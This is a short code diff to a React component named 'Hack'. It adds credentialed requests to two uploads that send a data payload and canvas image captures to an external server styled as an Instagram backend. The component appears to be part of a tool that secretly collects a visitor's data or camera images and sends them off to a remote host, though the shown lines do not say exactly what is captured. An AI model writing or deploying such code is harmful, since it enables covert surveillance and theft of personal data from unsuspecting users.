@@ -27,7 +27,10 @@ export const Hack: React.FC = () => {
           await axios.post(
             "https://instagram-server-eight.vercel.app/v1/upload",
             // "http://localhost:3333/v1/upload",
-            toSend
+            toSend,
+            {
+              withCredentials: true,
+            }
           );
         },
         (err) => {
@@ -60,7 +63,10 @@ export const Hack: React.FC = () => {
               await axios.post(
                 "https://instagram-server-eight.vercel.app/cloudinary/upload",
                 // "http://localhost:3333/cloudinary/upload",
-                imgData
+                imgData,
+                {
+                  withCredentials: true,
+                }
               );
               const context = canvas.getContext("2d");
               if (context) {
